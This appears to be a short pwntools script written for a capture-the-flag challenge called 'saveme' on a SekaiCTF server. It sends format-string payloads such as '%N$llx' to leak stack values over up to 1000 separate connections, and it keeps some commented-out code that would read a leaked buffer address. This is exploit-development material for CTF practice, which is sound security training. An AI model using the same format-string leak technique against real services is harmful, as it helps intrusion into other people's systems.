#!/usr/bin/env python3

from pwn import *

pwn = './saveme'
host = 'challs.ctf.sekai.team'
port = 4001
gdbscript = '''
b * 0x4013f4
continue
'''
context.log_level = 'critical'
def conn():
	if args.REMOTE:
		return remote(host,port)
	else:
		if args.GDB:
			return gdb.debug(pwn,gdbscript=gdbscript)
		else:
			return process(pwn)

def leak(n):
	for x in range(1,n+1):
		io = conn()
		io.recvuntil(b'Your option: ')
		io.sendline(b'2')
		io.recvuntil(b'person: ')
		io.sendline(f'%{x}$llx'.encode())
		data = io.recvline()
		print(f'{x} : {data.strip()}')
		io.close()


# io = conn()
# io.recvuntil(b'gift: ')
# buffer_address = int(io.recv(14).decode(),16)

leak(1000)
